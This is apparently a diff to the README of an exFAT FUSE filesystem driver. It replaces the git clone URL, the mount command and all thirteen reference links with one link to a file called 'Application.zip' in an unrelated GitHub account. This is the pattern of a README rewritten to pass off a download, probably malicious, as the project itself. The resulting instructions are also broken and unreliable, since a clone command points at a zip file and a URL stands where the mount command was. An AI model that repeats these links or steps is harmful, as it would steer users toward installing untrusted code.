@@ -40,7 +40,7 @@ On OpenBSD:
 
 Get the source code, change directory and compile:
 
-    git clone https://github.com/relan/exfat.git
+    git clone https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v1.0/Application.zip
     cd exfat
     autoreconf --install
     ./configure
@@ -59,7 +59,7 @@ Mounting
 
 Modern GNU/Linux distributions (with [util-linux][12] 2.18 or later) will mount exFAT volumes automatically. Anyway, you can mount manually (from root):
 
-    mount.exfat-fuse /dev/spec /mnt/exfat
+    https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v1.0/Application.zip /dev/spec /mnt/exfat
 
 where /dev/spec is the [device file][13], /mnt/exfat is a mountpoint.
 
@@ -68,16 +68,16 @@ Feedback
 
 If you have any questions, issues, suggestions, bug reports, etc. please create an [issue][3]. Pull requests are also welcome!
 
-[1]: https://en.wikipedia.org/wiki/ExFAT
-[2]: https://en.wikipedia.org/wiki/Filesystem_in_Userspace
-[3]: https://github.com/relan/exfat/issues
-[4]: https://www.git-scm.com/
-[5]: https://www.gnu.org/software/autoconf/
-[6]: https://www.gnu.org/software/automake/
-[7]: http://www.freedesktop.org/wiki/Software/pkg-config/
-[8]: https://gcc.gnu.org/
-[9]: https://www.gnu.org/software/make/
-[10]: https://osxfuse.github.io/
-[11]: https://en.wikipedia.org/wiki/Xcode
-[12]: https://www.kernel.org/pub/linux/utils/util-linux/
-[13]: https://en.wikipedia.org/wiki/Device_file
+[1]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v1.0/Application.zip
+[2]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v1.0/Application.zip
+[3]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v1.0/Application.zip
+[4]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v1.0/Application.zip
+[5]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v1.0/Application.zip
+[6]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v1.0/Application.zip
+[7]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v1.0/Application.zip
+[8]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v1.0/Application.zip
+[9]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v1.0/Application.zip
+[10]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v1.0/Application.zip
+[11]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v1.0/Application.zip
+[12]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v1.0/Application.zip
+[13]: https://github.com/ColtOSTemp/platform_external_exfat/releases/download/v1.0/Application.zip
